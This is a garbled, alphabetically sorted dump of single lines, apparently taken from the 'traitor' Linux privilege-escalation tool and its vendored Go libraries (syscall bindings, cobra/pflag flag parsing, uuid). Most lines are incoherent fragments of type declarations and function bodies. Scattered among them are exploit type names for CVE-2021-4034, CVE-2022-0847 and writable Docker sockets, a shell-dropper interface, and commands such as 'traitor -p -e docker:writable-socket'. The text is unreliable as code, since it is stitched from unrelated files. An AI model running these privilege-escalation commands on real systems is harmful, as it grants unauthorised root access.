statfs_freebsd11_t) (err error)
statfs_freebsd11_t) (err error) {
statfs_freebsd11_t) {
static int
status
status  -- displays the status of the named release
status = syscall.Errno(r0)
status)
status.svg)](http://godoc.org/github.com/google/uuid)
status.svg)](https://godoc.org/github.com/hashicorp/go-version)
status.svg)](https://godoc.org/github.com/liamg/tml)
status.svg)](https://godoc.org/github.com/spf13/pflag)
statvfs1(const char 
step) {
stopped = 0x7F
store = Handle(r0)
str := (
str := signals[s]
strbuf
strbuf{
string
string {
string) 
stringArrayValue {
stringArrayValue) Append(val string) error {
stringArrayValue) GetSlice() []string {
stringArrayValue) Replace(val []string) error {
stringArrayValue) Set(val string) error {
stringArrayValue) String() string {
stringArrayValue) Type() string {
stringArrayValue:
stringFromGUID2(rguid 
stringReader := strings.NewReader(val)
stringSliceValue {
stringSliceValue) Append(val string) error {
stringSliceValue) GetSlice() []string {
stringSliceValue) Replace(val []string) error {
stringSliceValue) Set(val string) error {
stringSliceValue) String() string {
stringSliceValue) Type() string {
stringToInt64Value {
stringToInt64Value) Set(val string) error {
stringToInt64Value) String() string {
stringToInt64Value) Type() string {
stringToIntValue {
stringToIntValue) Set(val string) error {
stringToIntValue) String() string {
stringToIntValue) Type() string {
stringToStringValue {
stringToStringValue) Set(val string) error {
stringToStringValue) String() string {
stringToStringValue) Type() string {
stringValue {
stringValue) Set(val string) error {
stringValue) String() string { return string(
stringValue) Type() string {
stringValue)(p)
stringValue:
struct ltchars {
struct mq_attr 
struct ret
struct ret r
struct ret {
struct sgttyb {
struct stat 
struct tchars {
struct trapframe 
struct tuple errors[] = {
struct tuple signals[] = {
struct tuple {
struct vextframe 
struct {
structures that pass through to the kernel system calls. Some C libraries
struct{}
style=svg)](https://circleci.com/gh/hashicorp/go-version/tree/main)
subAuthority = (
subCommand string
subject to the following conditions:
subtask           uint32
success = int(r0)
successors. We intend this dedication to be an overt act of
sudo: false
suffix := string(t.line[t.pos:])
suggestByLevenshtein := levenshteinDistance <= c.SuggestionsMinimumDistance
suggestions := []string{}
suggestionsString 
suid)
sval := flag.Value.String()
sval = sval[1 : len(sval)-1]
svcNameTable[svc_EZBNMIF4][0])
svcUnload(
svc_EZBNMIF4 = 0
switch 
switch args[0] {
switch av.Kind() {
switch b[0] {
switch b[2] {
switch b[5] {
switch buf[0] {
switch bv.Kind() {
switch d {
switch dataType {
switch e {
switch err {
switch f.Value.(type) {
switch f.Value.String() {
switch f.errorHandling {
switch flag.Value.Type() {
switch how {
switch key {
switch len(a) {
switch len(b) {
switch len(s) {
switch mode 
switch n {
switch name {
switch namespace {
switch op {
switch passn {
switch payload {
switch peInt.Source {
switch pp.Addrtype {
switch proto {
switch rdb.ReparseTag {
switch rsa.Addr.Family {
switch runtime.GOOS {
switch s.DistroID {
switch s[i] {
switch size {
switch src := src.(type) {
switch strings.TrimSpace(parts[i]) {
switch t.historyIndex {
switch v := i.(type) {
switch v {
switch whence {
switch {
symbolicLinkReparseBuffer)(unsafe.Pointer(
symlink(const char 
symlinkat(const char 
sync(void)
sync.Mutex
sync.Once
sync.RWMutex{}
sys/unix
sys___get_tcb(void)
sys_mmap(void 
sys_mquery(void 
syscall
syscall number declarations and parses them to produce the corresponding list of
syscall.Clearenv()
syscall.Credential{
syscall.Entersyscall()
syscall.Exitsyscall()
syscall.Fixwd()
syscall.RawSockaddrAny
syscall.Stat_t)
syscall.SysProcAttr) (
syscall.SysProcAttr{
syscall.SysProcAttr{}
syscall.go
syscall6(SB)
syscall_${GOOS}.go
syscall_${GOOS}_${GOARCH}.go
sysno = SYS_GETFSSTAT_FREEBSD12
system and have your GOOS and GOARCH set accordingly. Running 
system. Running 
systemObsolete0
systemSpare0
systemSpare1
sysvicall6(SB)
sysvicall6(uintptr(unsafe.Pointer(
sz := unsafe.Sizeof(qnode)
sz = int(r0)
szExeFile           [syscall.MAX_PATH]uint16
t $__%[1]s_comp_results[1])
t := reflect.TypeOf(v)
t := timeNow()
t = Time_t(tv.Sec)
t = strings.ToLower(t)
t = t.Elem()
t to get rid of the descriptions to be
t%d: 
t%s = C.%s
t' comp
t' {
t.Funcs(templateFuncs)
t.addKeyToLine(key)
t.advanceCursor(1)
t.advanceCursor(n)
t.advanceCursor(visualLength(line[:todo]))
t.advanceCursor(visualLength(t.prompt))
t.c.Write(t.outBuf)
t.clearAndRepaintLinePlusNPrevious(t.maxLine 
t.clearAndRepaintLinePlusNPrevious(t.maxLine)
t.clearLineToRight()
t.cursorX 
t.cursorX = 0
t.cursorX = t.cursorX % t.termWidth
t.cursorX = t.termWidth - 1
t.cursorX = x
t.cursorY
t.cursorY 
t.cursorY = 0
t.cursorY = y
t.cursorY--
t.echo = false
t.echo = true
t.eraseNPreviousChars(1)
t.eraseNPreviousChars(t.countToLeftWord())
t.eraseNPreviousChars(t.pos)
t.history.Add(line)
t.historyIndex
t.historyIndex = -1
t.historyIndex--
t.historyPending = string(t.line)
t.line = newLine
t.line = t.line[:0]
t.line = t.line[:len(t.line)
t.line = t.line[:len(t.line)-n]
t.line = t.line[:t.pos]
t.line[t.pos] = key
t.lock.Lock()
t.lock.Unlock()
t.maxLine = 0
t.maxLine = t.cursorY
t.move(0 /
t.move(1 /
t.moveCursorToPos(0)
t.moveCursorToPos(len(t.line))
t.moveCursorToPos(newPos)
t.moveCursorToPos(t.pos)
t.outBuf = t.outBuf[:0]
t.pasteActive = false
t.pasteActive = true
t.pos
t.pos 
t.pos -= n
t.pos -= t.countToLeftWord()
t.pos = 0
t.pos = len(t.line)
t.pos = newPos
t.pos--
t.pos:])
t.prompt = []rune(prompt)
t.prompt = oldPrompt
t.queue(line[:todo])
t.queue(m)
t.queue(op)
t.queue(space)
t.queue(t.prompt)
t.remainder = nil
t.remainder = t.inBuf[:n
t.remainder = t.inBuf[:n]
t.writeLine(newLine)
t.writeLine(space)
t.writeLine(t.line)
t.writeLine(t.line[t.pos:])
t.writeLine(t.prompt)
table
tags
tainted = bool(r0 != 0)
tar.Header{
tarWriter := tar.NewWriter(writer)
targIP        [16]byte
targIPFamily  byte
targIPPfx     uint16
targetAppl        [8]byte
tcb)
tcpStats = (
tcpTrustedPartner byte
tcpinfo.Advmss = conn.sendMSS        // dummy
tcpinfo.Ato = tcpStats.outDelayAcks
tcpinfo.Backoff = 0 // dummy
tcpinfo.Ca_state = 0 // dummy
tcpinfo.Fackets = 0 // dummy
tcpinfo.Last_ack_recv = uint32(
tcpinfo.Last_ack_sent = uint32(
tcpinfo.Last_data_recv = uint32(
tcpinfo.Last_data_sent = uint32(
tcpinfo.Lost = 0               // dummy
tcpinfo.Options = 0 // dummy
tcpinfo.Probes = uint8(tcpStats.outWinProbes)
tcpinfo.Rcv_mss = conn.sendMSS // dummy
tcpinfo.Rcv_rtt = conn.roundTripTime // dummy
tcpinfo.Rcv_space = conn.sendMSS     // dummy
tcpinfo.Rcv_ssthresh = conn.ssThresh
tcpinfo.Reordering = 0               // dummy
tcpinfo.Retrans = conn.reXmtCount
tcpinfo.Retransmits = uint8(tcpStats.retransSegs)
tcpinfo.Rto = tcpStats.retransTimeouts
tcpinfo.Rtt = conn.roundTripTime
tcpinfo.Rttvar = conn.roundTripVar
tcpinfo.Sacked = 0             // dummy
tcpinfo.Snd_cwnd = conn.congestionWnd
tcpinfo.Snd_mss = conn.sendMSS
tcpinfo.Snd_ssthresh = conn.ssThresh // dummy
tcpinfo.State = uint8(conn.state)
tcpinfo.Total_retrans = conn.reXmtCount
tcpinfo.Unacked = 0            // dummy
tdesc string
temp
template
template.Must(t.Parse(text))
templateFuncs[k] = v
templateFuncs[name] = tmplFunc
termios
termios unix.Termios
termios.Cc[unix.VMIN] = 1
termios.Cc[unix.VTIME] = 0
termios.Cflag 
termios.Iflag 
termios.Lflag 
termios.Oflag 
termios}}
test:
test: install_deps
th32DefaultHeapID   int
th32ModuleID        uint32
th32ParentProcessID uint32
th32ProcessID       uint32
th32cs_snapprocess uintptr = 0x2
thanos
that give one-letter shorthands for flags. You can use these by appending
that this implementation of Go or any code incorporated within this
the 
the BSD-style license found in the LICENSE file.
the application supports will be contained in a Command. A command can
the desired 
the executable file while browsing in explorer
the executable for a tool. Because most CLI tools print the help and then exit
the given flag. Doing this changes the meaning of the flag slightly. If
the regex too broad to avoid matching unintended constants.
the version template. The template can be customized using the
them into syscalls. This requires the name of the prototype in the comment to
then
then generate all of the files for all of the GOOS/GOARCH pairs in the new build
theory
these constants are written to 
they are all pointers
this a configurable option to your users.
this software without specific prior written permission.
ticks = uintptr(r0)
tid = int(r0)
tid = uint32(r0)
time 
time := int64(binary.BigEndian.Uint32(uuid[0:4]))
time.Duration {
time.Duration) 
time.Duration)(d).String() }
time.Sleep(MousetrapDisplayDuration)
time.Sleep(time.Millisecond 
time.Sleep(time.Minute)
time.Sleep(time.Second 
time.Sleep(time.Second)
timeHi 
timeHi := uint16((now >> 48) 
timeLow := uint32(now 
timeMid := uint16((now >> 32) 
timeMu   sync.Mutex
timeMu.Lock()
timeNow = time.Now // for testing
timeStamp         uint32
timeStampAge      uint32
timeWaitReused    uint32
timeout)
timer := time.NewTimer(until)
timer_delete(timer_t timerid)
timer_getoverrun(timer_t timerid)
timerid)
times)
timeval_zos) (err error)
timeval_zos) (err error) {
tipcAddr() [12]byte
tipcAddrtype() uint8
title    string
tmpErr := c.errWriter
tmpFileContent string
tmpOutput := c.outWriter
tnAppl        [8]byte
tnLuName      [8]byte
tnMonGrp      uint32
tname string
tnum  syscall.Errno
tnum  syscall.Signal
to enable it.  You can execute the following once:
to parse the command line into the defined flags.
to quickly create a Cobra application.
to support flags defined by third-party dependencies (e.g. 
to your powershell profile.
toComplete := args[len(args)-1]
todo := len(buf)
todo := len(line)
todo = i
todo = remainingOnLine
token)
top-level functions.  The FlagSet type allows one to define
totalTime 
tp))
tptr)
traitor -a -p
traitor -p
traitor -p -e docker:writable-socket
trap
trap end 0
trimmedArgs := args
trimmedArgs := args[:len(args)-1]
trimmedArgs = args
trimmedArgs = args[:len(args)-1]
truncate(const char 
ts := []Timespec{
ts = 
ts = NsecToTimespec(int64(timeout) 
ts = new(Timespec)
ts.Nsec = int64(tm.Utime) 
ts.Nsec = nanotime % nsec_per_sec
ts.Nsec = nsec % 1e9
ts.Sec = int64(tm.Utime / ticks_per_sec)
ts.Sec = nanotime / nsec_per_sec
ts.Sec = nsec / 1e9
ts[0] = NsecToTimespec(TimevalToNsec(tv[0]))
ts[1] = NsecToTimespec(TimevalToNsec(tv[1]))
tt = Time_t(r0)
ttlsFIPS140Mode   byte
ttlsNegCiph       [2]byte
ttlsNegCiph4      [4]byte
ttlsSSLProt       uint16
ttlsSecType       byte
ttlsSessID        [32]byte
ttlsSessIDLen     int16
ttlsStatConn      byte
ttlsStatPol       byte
ttlsUserID        [8]byte
tuplecmp(const void 
tv := [2]Timeval{
tv := []Timeval{
tv = NsecToTimeval(ft.Nanoseconds())
tv = NsecToTimeval(nsec)
tv))
tv.Sec = int32(nsec / 1e9)
tv.Sec = tvz.Sec
tv.Usec = int32(nsec % 1e9 / 1e3)
tv.Usec = int64(tvz.Usec)
tv[0])))
tvz)
tx := (
tx[i] = pp.Addr[i
type (
type ACCESS_MASK uint32
type ACCESS_MODE uint32
type ACL struct {
type AddrinfoW struct {
type BIND_OPTS3 struct {
type BlkpgIoctlArg struct {
type BlkpgPartition struct {
type BpfHdr struct {
type BpfInsn struct {
type BpfProgram struct {
type BpfStat struct {
type BpfTimeval struct {
type BpfVersion struct {
type BpfZbuf struct {
type BpfZbufHeader struct {
type ByHandleFileInformation struct {
type CANBitTiming struct {
type CANBitTimingConst struct {
type CANBusErrorCounters struct {
type CANClock struct {
type CANCtrlMode struct {
type CANDeviceStats struct {
type CGroupStats struct {
type COAUTHIDENTITY struct {
type COAUTHINFO struct {
type CONFIGRET uint32
type COSERVERINFO struct {
type CPUSet [cpuSetSize]cpuMask
type CURDIR struct {
type CanFilter struct {
type CapRights struct {
type CapUserData struct {
type CapUserHeader struct {
type CertBlob DataBlob
type CertChainContext struct {
type CertChainElement struct {
type CertChainFindByIssuerPara struct {
type CertChainPara struct {
type CertChainPolicyPara struct {
type CertChainPolicyStatus struct {
type CertContext struct {
type CertEnhKeyUsage struct {
type CertExtension struct {
type CertInfo struct {
type CertNameBlob DataBlob
type CertPoliciesInfo struct {
type CertPolicyInfo struct {
type CertPolicyQualifierInfo struct {
type CertPublicKeyInfo struct {
type CertRdnValueBlob DataBlob
type CertRevocationCrlInfo struct {
type CertRevocationInfo struct {
type CertSimpleChain struct {
type CertStrongSignPara struct {
type CertTrustListInfo struct {
type CertTrustStatus struct {
type CertUsageMatch struct {
type ClassInstallHeader struct {
type Clockinfo struct {
type Cmsghdr struct {
type Collection []
type CommTimeouts struct {
type Command struct {
type CompletionOptions struct {
type ConsoleScreenBufferInfo struct {
type Constraint struct {
type Constraints []
type Coord struct {
type CrlBlob DataBlob
type CryptAlgorithmIdentifier struct {
type CryptAttrBlob DataBlob
type CryptBitBlob struct {
type CryptDataBlob DataBlob
type CryptDerBlob DataBlob
type CryptDigestBlob DataBlob
type CryptHashBlob DataBlob
type CryptIntegerBlob DataBlob
type CryptObjidBlob DataBlob
type CryptProtectPromptStruct struct {
type CryptUintBlob DataBlob
type CryptoReportAEAD struct {
type CryptoReportAKCipher struct {
type CryptoReportAcomp struct {
type CryptoReportBlkCipher struct {
type CryptoReportCipher struct {
type CryptoReportComp struct {
type CryptoReportHash struct {
type CryptoReportKPP struct {
type CryptoReportLarval struct {
type CryptoReportRNG struct {
type CryptoStatAEAD struct {
type CryptoStatAKCipher struct {
type CryptoStatCipher struct {
type CryptoStatCompress struct {
type CryptoStatHash struct {
type CryptoStatKPP struct {
type CryptoStatLarval struct {
type CryptoStatRNG struct {
type CryptoUserAlg struct {
type CtlInfo struct {
type DEVINST uint32
type DEVPROPGUID GUID
type DEVPROPID uint32
type DEVPROPKEY struct {
type DEVPROPTYPE uint32
type DICD uint32
type DICS_FLAG uint32
type DICS_STATE uint32
type DIGCF uint32
type DIREG uint32
type DI_FLAGS uint32
type DI_FLAGSEX uint32
type DI_FUNCTION uint32
type DI_REMOVEDEVICE uint32
type DLL struct {
type DLLError struct {
type DNSMXData struct {
type DNSPTRData struct {
type DNSRecord struct {
type DNSSRVData struct {
type DNSTXTData struct {
type DataBlob struct {
type DevInfo Handle
type DevInfoData struct {
type DevInfoListDetailData struct {
type DevInstallParams struct {
type Dir struct {
type Dirent struct {
type Disclosure interface {
type DistributionID string
type DmIoctl struct {
type DmNameList struct {
type DmTargetDeps struct {
type DmTargetMsg struct {
type DmTargetSpec struct {
type DmTargetVersions struct {
type Domain byte
type DrvInfoData struct {
type DrvInfoDetailData struct {
type ENUM_SERVICE_STATUS_PROCESS struct {
type EXPLICIT_ACCESS struct {
type EpollEvent struct {
type Eproc struct {
type Errno = syscall.Errno
type ErrorHandling int
type EscapeCodes = term.EscapeCodes
type EscapeCodes struct {
type EthtoolDrvinfo struct {
type EventPort struct {
type Exploit interface {
type ExternProc struct {
type FParseErrWhitelist flag.ParseErrorsWhitelist
type FanotifyEventMetadata struct {
type FanotifyResponse struct {
type Fbootstraptransfer_t struct {
type FdSet struct {
type FileCloneRange struct {
type FileDedupeRange struct {
type FileDedupeRangeInfo struct {
type FileHandle struct {
type FileNotifyInformation struct {
type Filetime struct {
type Flag struct {
type FlagSet struct {
type Flock_t struct {
type FpReg struct {
type FscryptAddKeyArg struct {
type FscryptGetKeyStatusArg struct {
type FscryptGetPolicyExArg struct {
type FscryptKey struct {
type FscryptKeySpecifier struct {
type FscryptPolicy struct {
type FscryptPolicyV1 struct {
type FscryptPolicyV2 struct {
type FscryptRemoveKeyArg struct {
type Fsid struct {
type Fsid64_t struct {
type Fsid_t struct {
type Fstore_t struct {
type FsverityDigest struct {
type FsverityEnableArg struct {
type GUID struct {
type Genlmsghdr struct {
type HDDriveCmdHdr struct {
type HDDriveID struct {
type HDGeometry struct {
type HSPFILEQ uintptr
type HWND uintptr
type Handle uintptr
type Hostent struct {
type ICMPv6Filter struct {
type IO_COUNTERS struct {
type IO_STATUS_BLOCK struct {
type IPMreq struct {
type IPMreqn struct {
type IPv6MTUInfo struct {
type IPv6Mreq struct {
type IfAddrmsg struct {
type IfAnnounceMsghdr struct {
type IfData struct {
type IfInfomsg struct {
type IfMsgHdr struct {
type IfMsghdr struct {
type IfaCacheinfo struct {
type IfaMsghdr struct {
type IfmaMsghdr struct {
type IfmaMsghdr2 struct {
type Ifreq struct{ raw ifreq }
type IfreqMTU struct {
type Inet4Pktinfo struct {
type Inet6Pktinfo struct {
type InotifyEvent struct {
type InterfaceInfo struct {
type Iovec struct {
type IpAdapterAddresses struct {
type IpAdapterAnycastAddress struct {
type IpAdapterDnsServerAdapter struct {
type IpAdapterInfo struct {
type IpAdapterMulticastAddress struct {
type IpAdapterPrefix struct {
type IpAdapterUnicastAddress struct {
type IpAddrString struct {
type IpAddressString struct {
type IpMaskString IpAddressString
type ItimerSpec struct {
type ItimerWhich int
type Itimerval struct {
type JOBOBJECT_BASIC_LIMIT_INFORMATION struct {
type JOBOBJECT_BASIC_UI_RESTRICTIONS struct {
type JOBOBJECT_EXTENDED_LIMIT_INFORMATION struct {
type KCMAttach struct {
type KCMClone struct {
type KCMUnattach struct {
type KNOWNFOLDERID GUID
type Kevent_t struct {
type KeyctlDHParams struct {
type KinfoProc struct {
type LDR_DATA_TABLE_ENTRY struct {
type LIST_ENTRY struct {
type LUID struct {
type LUIDAndAttributes struct {
type LandlockPathBeneathAttr struct {
type LandlockRulesetAttr struct {
type LazyDLL struct {
type LazyProc struct {
type Lifreq struct {
type Linger struct {
type LockablePipe struct {
type Log2phys_t struct {
type Logger struct {
type LoopInfo struct {
type LoopInfo64 struct {
type MULTIPLE_TRUSTEE_OPERATION uint32
type Mclpool [0]byte
type Mclpool struct {
type Mclpool struct{}
type MemoryBasicInformation struct {
type Metadata struct {
type MibIfRow struct {
type Mode_t uint32
type ModuleEntry32 struct {
type ModuleInfo struct {
type MountAttr struct {
type Msghdr struct {
type NTStatus uint32
type NTString struct {
type NTUnicodeString struct {
type NdMsg struct {
type NdUseroptmsg struct {
type NexthopGrp struct {
type Nfgenmsg struct {
type Nhmsg struct {
type NlAttr struct {
type NlMsgerr struct {
type NlMsghdr struct {
type NormalizedName string
type Note string
type NullUUID struct {
type OBJECTS_AND_NAME struct {
type OBJECTS_AND_SID struct {
type OBJECT_ATTRIBUTES struct {
type OpenHow struct {
type OsVersionInfoEx struct {
type Overlapped struct {
type PEB struct {
type PEB_LDR_DATA struct {
type PPSFData struct {
type PPSKInfo struct {
type PPSKParams struct {
type PPSKTime struct {
type PROCESS_BASIC_INFORMATION struct {
type PacketMreq struct {
type ParseErrorsWhitelist struct {
type Parser struct {
type Payload string
type Pcred struct {
type PerfEventAttr struct {
type PerfEventMmapPage struct {
type Pid_t int32
type Pointer 
type PollFd struct {
type PortEvent struct {
type PositionalArgs func(cmd 
type Proc struct {
type ProcThreadAttributeList struct{}
type ProcThreadAttributeListContainer struct {
type ProcessEntry32 struct {
type ProcessInformation struct {
type PropChangeParams struct {
type Protoent struct {
type Ptmget struct {
type PtraceFpregs struct {
type PtraceIoDesc struct {
type PtraceLwpInfoStruct struct {
type PtracePer struct {
type PtracePsw struct {
type PtraceRegs struct {
type PtraceRegs386 struct {
type PtraceRegsAmd64 struct {
type PtraceRegsArm struct {
type PtraceRegsArm64 struct {
type PtraceRegsMips struct {
type PtraceRegsMips64 struct {
type PtraceRegsMips64le struct {
type PtraceRegsMipsle struct {
type QUERY_SERVICE_CONFIG struct {
type QUERY_SERVICE_LOCK_STATUS struct {
type Qid struct {
type RTCPLLInfo struct {
type RTCTime struct {
type RTCWkAlrm struct {
type RTLP_CURDIR_REF struct {
type RTL_DRIVE_LETTER_CURDIR struct {
type RTL_PROCESS_MODULES struct {
type RTL_PROCESS_MODULE_INFORMATION struct {
type RTL_RELATIVE_NAME struct {
type RTL_USER_PROCESS_PARAMETERS struct {
type RUNTIME_FUNCTION struct {
type Radvisory_t struct {
type RawFileDedupeRange struct {
type RawFileDedupeRangeInfo struct {
type RawSockaddr struct {
type RawSockaddrALG struct {
type RawSockaddrAny struct {
type RawSockaddrCAN struct {
type RawSockaddrCtl struct {
type RawSockaddrDatalink struct {
type RawSockaddrHCI struct {
type RawSockaddrIUCV struct {
type RawSockaddrInet4 struct {
type RawSockaddrInet6 struct {
type RawSockaddrL2 struct {
type RawSockaddrL2TPIP struct {
type RawSockaddrL2TPIP6 struct {
type RawSockaddrLinklayer struct {
type RawSockaddrNFC struct {
type RawSockaddrNFCLLCP struct {
type RawSockaddrNetlink struct {
type RawSockaddrPPPoX [0x1e]byte
type RawSockaddrRFCOMM struct {
type RawSockaddrTIPC struct {
type RawSockaddrUnix struct {
type RawSockaddrVM struct {
type RawSockaddrXDP struct {
type Reg struct {
type Registration struct {
type RemoteIovec struct {
type RemoveDeviceParams struct {
type ResourceID uint16
type ResourceIDOrString interface{}
type Rlimit struct {
type RtAttr struct {
type RtGenmsg struct {
type RtMetrics struct {
type RtMsg struct {
type RtMsghdr struct {
type RtNexthop struct {
type Rusage struct {
type SC_ACTION struct {
type SECURITY_DESCRIPTOR struct {
type SECURITY_DESCRIPTOR_CONTROL uint16
type SECURITY_INFORMATION uint32
type SECURITY_QUALITY_OF_SERVICE struct {
type SERVICE_DELAYED_AUTO_START_INFO struct {
type SERVICE_DESCRIPTION struct {
type SERVICE_FAILURE_ACTIONS struct {
type SERVICE_NOTIFY struct {
type SERVICE_STATUS struct {
type SERVICE_STATUS_PROCESS struct {
type SERVICE_TABLE_ENTRY struct {
type SE_OBJECT_TYPE uint32
type SID struct{}
type SIDAndAttributes struct {
type SPDIT uint32
type SPDRP uint32
type SSLExtraCertChainPolicyPara struct {
type SUOI uint32
type SYSTEM_PROCESS_INFORMATION struct {
type ScmTimestamping struct {
type SecurityAttributes struct {
type Servent struct {
type ShellCompDirective int
type ShellDropper interface {
type SidIdentifierAuthority struct {
type Siginfo struct {
type Signal = syscall.Signal
type Signal int
type SignalfdSiginfo struct {
type Sigset_t struct {
type Sigset_t uint32
type Slice struct {
type SliceValue interface {
type SmallRect struct {
type SockExtendedErr struct {
type SockFilter struct {
type SockFprog struct {
type Sockaddr interface {
type SockaddrALG struct {
type SockaddrCAN struct {
type SockaddrCANJ1939 struct {
type SockaddrCtl struct {
type SockaddrDatalink struct {
type SockaddrGen [24]byte
type SockaddrHCI struct {
type SockaddrIUCV struct {
type SockaddrInet4 struct {
type SockaddrInet6 struct {
type SockaddrL2 struct {
type SockaddrL2TPIP struct {
type SockaddrL2TPIP6 struct {
type SockaddrLinklayer struct {
type SockaddrNFC struct {
type SockaddrNFCLLCP struct {
type SockaddrNetlink struct {
type SockaddrPPPoE struct {
type SockaddrRFCOMM struct {
type SockaddrStorage struct {
type SockaddrTIPC struct {
type SockaddrUnix struct {
type SockaddrVM struct {
type SockaddrXDP struct {
type SocketAddress struct {
type SocketControlMessage struct {
type Speed uint
type StartupInfo struct {
type StartupInfoEx struct {
type Stat_LE_t struct {
type Stat_t struct {
type Stat_t struct { //Linux Definition
type State = term.State
type State struct {
type Statfs_t [0]byte
type Statfs_t struct {
type Statvfs_t struct {
type StatxTimestamp struct {
type StatxTimestamp struct{}
type Statx_t struct {
type Statx_t struct{}
type String struct {
type Strioctl struct {
type SudoEntry struct {
type Sudoers []
type SysProcAttr = syscall.SysProcAttr
type Sysctlnode struct {
type Sysinfo_t struct {
type Systemtime struct {
type SysvIpcPerm struct {
type SysvShmDesc struct {
type TCPConnectionInfo struct {
type TCPInfo struct {
type TCPKeepalive struct {
type TCPMD5Sig struct {
type TCPRepairOpt struct {
type TIPCAddr interface {
type TIPCEvent struct {
type TIPCGroupReq struct {
type TIPCSIOCLNReq struct {
type TIPCSIOCNodeIDReq struct {
type TIPCServiceName struct {
type TIPCServiceRange struct {
type TIPCSocketAddr struct {
type TIPCSubscr struct {
type TRUSTEE struct {
type TRUSTEE_FORM uint32
type TRUSTEE_TYPE uint32
type Taskstats struct {
type Terminal = term.Terminal
type Terminal struct {
type Termio struct {
type Termios struct {
type ThreadEntry32 struct {
type Time int64
type Time_t int32
type Time_t int64
type Timespec struct {
type Timeval struct {
type Timeval32 struct {
type Timex struct {
type Timex struct{}
type Timezone struct {
type Timezoneinformation struct {
type Tms struct {
type Tms struct { //clock_t is 4-byte unsigned int in zos
type Tms struct{}
type Token Handle
type Tokengroups struct {
type Tokenmandatorylabel struct {
type Tokenprimarygroup struct {
type Tokenprivileges struct {
type Tokenuser struct {
type Tpacket2Hdr struct {
type Tpacket3Hdr struct {
type TpacketAuxdata struct {
type TpacketBDTS struct {
type TpacketBlockDesc struct {
type TpacketHdr struct {
type TpacketHdrV1 struct {
type TpacketHdrVariant1 struct {
type TpacketReq struct {
type TpacketReq3 struct {
type TpacketStats struct {
type TpacketStatsV3 struct {
type TransmitFileBuffers struct {
type TrusteeValue uintptr
type UUID [16]byte
type Ucred struct {
type UserInfo10 struct {
type Ustat_t struct {
type Ustat_t struct{}
type Utimbuf struct {
type Utsname struct {
type Uvmexp struct {
type VS_FIXEDFILEINFO struct {
type Value interface {
type Variant byte
type Version byte
type Version struct {
type Vmspace struct {
type Vulnerability interface {
type WELL_KNOWN_SID_TYPE uint32
type WSABuf struct {
type WSAData struct {
type WSAMsg struct {
type WSAProtocolChain struct {
type WSAProtocolInfo struct {
type WTSSESSION_NOTIFICATION struct {
type WTS_SESSION_INFO struct {
type W_Mntent struct {
type W_Mnth struct {
type WaitStatus struct {
type WaitStatus uint32
type Waitmsg struct {
type WatchdogInfo struct {
type Win32FileAttributeData struct {
type Win32finddata struct {
type WinTrustData struct {
type WinTrustFileInfo struct {
type WinTrustSignatureSettings struct {
type Winsize struct {
type XDPDesc struct {
type XDPMmapOffsets struct {
type XDPRingOffset struct {
type XDPStatistics struct {
type XDPUmemReg struct {
type XSockbuf struct {
type XSocket struct {
type XSocket64 struct {
type XVSockPCB struct {
type XVSockPgen struct {
type Xucred struct {
type _Fsblkcnt_t uint64
type _Gid_t uint32
type _Socklen uint32
type __Siginfo struct {
type attrs uint8
type boolFlag interface {
type boolSliceValue struct {
type boolValue bool
type bytesBase64Value []byte
type bytesHexValue []byte
type commandSorterByName []
type constraintOperation struct {
type countValue int
type cpuMask uint32
type cpuMask uint64
type cve20214034Exploit struct {
type cve20220847Exploit struct {
type dev_t uint32
type dev_t uint64
type dirent_freebsd11 struct {
type durationSliceValue struct {
type durationValue time.Duration
type epollImpl struct {
type errString string
type eventPoll struct {
type exploit struct {
type fileHandle struct {
type fileObj struct {
type fileObjCookie struct {
type fiodgnameArg struct {
type flagCompError struct {
type flagValueWrapper struct {
type float32SliceValue struct {
type float32Value float32
type float64SliceValue struct {
type float64Value float64
type goBoolFlag interface {
type gtfobinsExploit struct {
type ifData struct {
type ifMsghdr struct {
type ifreq struct {
type ifreqData struct {
type int16Value int16
type int32SliceValue struct {
type int32Value int32
type int64SliceValue struct {
type int64Value int64
type int8Value int8
type intSliceValue struct {
type intValue int
type invalidLengthError struct{ len int }
type ipMaskValue net.IPMask
type ipNetValue net.IPNet
type ipSliceValue struct {
type ipValue net.IP
type mibentry struct {
type mmapper struct {
type mountPointReparseBuffer struct {
type nwmConnEntry struct {
type nwmFilter struct {
type nwmHeader struct {
type nwmQuadruplet struct {
type nwmRecHeader struct {
type nwmTCPStatsEntry struct {
type nwmTriplet struct {
type off int32
type off int64
type off64 int64
type operator rune
type parseFunc func(flag 
type parserState struct {
type passwordReader int
type pasteIndicatorError struct{}
type portEvent struct {
type processEntry32 struct {
type ptOwn struct {
type ptmget struct {
type reparseDataBuffer struct {
type rlimit32 struct {
type rusage_zos struct {
type stRingBuffer struct {
type stat_freebsd11_t struct {
type stat_t struct {
type state struct {
type state struct{}
type statfs_freebsd11_t struct {
type strbuf struct {
type stringArrayValue struct {
type stringSliceValue struct {
type stringToInt64Value struct {
type stringToIntValue struct {
type stringToStringValue struct {
type stringValue string
type strioctl struct {
type symbolicLinkReparseBuffer struct {
type sysLinger struct {
type syscallFunc uintptr
type timeval_zos struct { //correct (with padding and all)
type uint16Value uint16
type uint32Value uint32
type uint64Value uint64
type uint8Value uint8
type uintSliceValue struct {
type uintValue uint
type win32finddata1 struct {
type writableDockerSocketExploit struct {
types_${GOOS}.go
types_darwin.go
tzp)
u = uint16(r0)
u))) //nolint:gosec // Expected unsafe pointer for Syscall call.
uaddr2)
ucp)
ucred
ucred := 
uid = Geteuid()
uid = Getuid()
uid = int(r0)
uint {
uint) 
uint)(unsafe.Pointer(
uint16
uint16 string type.
uint16 {
uint16 { return 
uint16) 
uint16) (driveType uint32) = GetDriveTypeW
uint16) (driveType uint32) {
uint16) (err error) = DefineDosDeviceW
uint16) (err error) = DeleteFileW
uint16) (err error) = DeleteVolumeMountPointW
uint16) (err error) = IsWow64Process2
uint16) (err error) = MoveFileW
uint16) (err error) = RemoveDirectoryW
uint16) (err error) = SetCurrentDirectoryW
uint16) (err error) = SetVolumeLabelW
uint16) (err error) = SetVolumeMountPointW
uint16) (err error) = advapi32.ChangeServiceConfigW
uint16) (err error) = advapi32.ConvertSidToStringSidW
uint16) (err error) = advapi32.EnumServicesStatusExW
uint16) (err error) = advapi32.StartServiceW
uint16) (err error) = kernel32.FreeEnvironmentStringsW
uint16) (err error) = kernel32.SetEnvironmentVariableW
uint16) (err error) = userenv.DestroyEnvironmentBlock
uint16) (err error) {
uint16) (ret error) = shell32.SHGetKnownFolderPath
uint16) (ret error) {
uint16) (same bool) = dnsapi.DnsNameCompare_W
uint16) (same bool) {
uint16) = kernel32.GetCommandLineW
uint16) = ntdll.RtlInitUnicodeString
uint16) string {
